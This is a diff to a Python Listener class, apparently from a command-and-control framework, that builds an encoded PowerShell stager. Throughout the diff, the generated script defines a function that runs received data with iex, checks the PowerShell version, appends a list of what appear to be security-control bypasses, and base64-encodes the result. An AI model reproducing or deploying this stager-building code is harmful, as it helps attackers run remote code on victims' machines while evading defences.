@@ -257,13 +257,11 @@ class Listener:
             prestager += "function goForIT ($rdata) {iex $($rdata)};"
             
             if safeChecks.lower() == "true":
-                prestager += "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4))"
+                prestager += "[System.Net.ServicePointManager]::Expect100Continue=0;"
+                prestager += "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4)){}"
 
             #for bypass in bypasses:
                 #stager += bypass
-
-            if safeChecks.lower() == "true":
-                prestager += "; [System.Net.ServicePointManager]::Expect100Continue=0;"
 
             stager = ";sleep(3);"
 
@@ -382,11 +380,13 @@ class Listener:
                     obfuscation_command=obfuscation_command,
                 )
             
-            prestager += "{"
+            if safeChecks.lower() == "true":
+                    prestager = prestager[:-2]
+                    prestager += "{"
             for bypass in bypasses:
-                prestager += bypass
+                prestager += "; " + bypass + ";"
             
-            prestager += "}"
+            if safeChecks.lower() == "true": prestager += "}"
             stager = prestager + stager
 
             # base64 encode the stager and return it
